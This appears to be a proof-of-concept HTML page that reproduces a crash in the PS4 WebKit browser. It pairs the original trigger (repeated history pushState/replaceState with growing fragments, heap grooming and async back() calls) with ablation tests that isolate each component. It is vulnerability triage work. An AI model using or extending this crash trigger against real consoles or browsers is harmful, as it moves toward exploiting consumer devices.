<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit â€“ Original Crash Reproduction</title>

</head>
<body>
<h2>ðŸŽ¯ PS4 WebKit â€“ Exact Original Crash Conditions</h2>

<button onclick="runOriginal()">ORIGINAL â€“ Full 50 iterations (WILL CRASH)</button>
<button onclick="runNoReplace()">TEST A â€“ Without replaceState</button>
<button onclick="runNoAsyncBack()">TEST B â€“ Without async back()</button>
<button onclick="runNoGrooming()">TEST C â€“ Without grooming</button>
<button onclick="run30Iters()">TEST D â€“ Only 30 iterations</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m, cls=""){ 
  const span = document.createElement("span");
  if(cls) span.className = cls;
  span.textContent = m + "\n";
  logEl.appendChild(span);
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;

let heap = [];
let sharedState = { i: 0, p: "" };

// -------------------------------------------------
// ORIGINAL â€“ Exact reproduction
// -------------------------------------------------
async function runOriginal(){
  logEl.textContent = "";
  heap = [];
  sharedState = { i: 0, p: "" };
  
  log("=== ORIGINAL â€“ EXACT REPRODUCTION ===", "critical");
  log("Expected: Crash at ITER 48 during async back()\n");
  
  let size = BASE;
  for(let i=0; i<50; i++){
    sharedState.i = i;
    sharedState.p = "A".repeat(size);
    
    heap.push("G".repeat(32768)); // 32 KB grooming
    
    log(`[ITER ${i}] size=${size}, heap=${(heap.length * 32 / 1024).toFixed(1)} MB`);
    
    history.pushState(sharedState, "", "#"+sharedState.p);
    history.replaceState(sharedState, "", "#"+sharedState.p);
    
    if(i % 6 === 0){
      setTimeout(()=>history.back(), 0);
      log("  â†’ async back() scheduled", "warn");
    }
    
    size += STEP;
    await sleep(3);
  }
  
  log("\n=== ORIGINAL END (should not reach) ===");
}

// -------------------------------------------------
// TEST A â€“ Remove replaceState
// -------------------------------------------------
async function runNoReplace(){
  logEl.textContent = "";
  heap = [];
  sharedState = { i: 0, p: "" };
  
  log("=== TEST A â€“ WITHOUT replaceState ===", "warn");
  log("Hypothesis: replaceState is critical component\n");
  
  let size = BASE;
  for(let i=0; i<50; i++){
    sharedState.i = i;
    sharedState.p = "A".repeat(size);
    heap.push("G".repeat(32768));
    
    log(`[ITER ${i}] size=${size}`);
    
    history.pushState(sharedState, "", "#"+sharedState.p);
    // NO replaceState here
    
    if(i % 6 === 0){
      setTimeout(()=>history.back(), 0);
      log("  â†’ async back() scheduled", "warn");
    }
    
    size += STEP;
    await sleep(3);
  }
  
  log("\n=== TEST A END ===");
  log("If reached: replaceState IS required for crash");
}

// -------------------------------------------------
// TEST B â€“ Remove async back()
// -------------------------------------------------
async function runNoAsyncBack(){
  logEl.textContent = "";
  heap = [];
  sharedState = { i: 0, p: "" };
  
  log("=== TEST B â€“ WITHOUT async back() ===", "warn");
  log("Hypothesis: async back() timing is critical\n");
  
  let size = BASE;
  for(let i=0; i<50; i++){
    sharedState.i = i;
    sharedState.p = "A".repeat(size);
    heap.push("G".repeat(32768));
    
    log(`[ITER ${i}] size=${size}`);
    
    history.pushState(sharedState, "", "#"+sharedState.p);
    history.replaceState(sharedState, "", "#"+sharedState.p);
    
    // NO async back here
    
    size += STEP;
    await sleep(3);
  }
  
  log("\n[FINAL] Execute single back() at end");
  await sleep(100);
  history.back();
  await sleep(200);
  
  log("\n=== TEST B END ===");
  log("If reached: async back() during loop IS required");
}

// -------------------------------------------------
// TEST C â€“ Remove grooming
// -------------------------------------------------
async function runNoGrooming(){
  logEl.textContent = "";
  heap = [];
  sharedState = { i: 0, p: "" };
  
  log("=== TEST C â€“ WITHOUT grooming ===", "warn");
  log("Hypothesis: heap grooming increases crash probability\n");
  
  let size = BASE;
  for(let i=0; i<50; i++){
    sharedState.i = i;
    sharedState.p = "A".repeat(size);
    
    // NO grooming here
    
    log(`[ITER ${i}] size=${size}`);
    
    history.pushState(sharedState, "", "#"+sharedState.p);
    history.replaceState(sharedState, "", "#"+sharedState.p);
    
    if(i % 6 === 0){
      setTimeout(()=>history.back(), 0);
      log("  â†’ async back() scheduled", "warn");
    }
    
    size += STEP;
    await sleep(3);
  }
  
  log("\n=== TEST C END ===");
  log("If reached: grooming is NOT required (but may help)");
}

// -------------------------------------------------
// TEST D â€“ Reduce iterations to 30
// -------------------------------------------------
async function run30Iters(){
  logEl.textContent = "";
  heap = [];
  sharedState = { i: 0, p: "" };
  
  log("=== TEST D â€“ ONLY 30 ITERATIONS ===", "warn");
  log("Hypothesis: needs cumulative state from 48+ iterations\n");
  
  let size = BASE;
  for(let i=0; i<30; i++){
    sharedState.i = i;
    sharedState.p = "A".repeat(size);
    heap.push("G".repeat(32768));
    
    log(`[ITER ${i}] size=${size}`);
    
    history.pushState(sharedState, "", "#"+sharedState.p);
    history.replaceState(sharedState, "", "#"+sharedState.p);
    
    if(i % 6 === 0){
      setTimeout(()=>history.back(), 0);
      log("  â†’ async back() scheduled", "warn");
    }
    
    size += STEP;
    await sleep(3);
  }
  
  log("\n=== TEST D END ===");
  log("If reached: 48+ iterations ARE required");
}

log("Ready. Execute in order:");
log("1. ORIGINAL - confirm crash still happens");
log("2. TEST A - isolate replaceState");
log("3. TEST B - isolate async back()");
log("4. TEST C - isolate grooming");
log("5. TEST D - isolate iteration count");
log("\nEach test removes ONE component to find what's essential.");
</script>
</body>
</html>
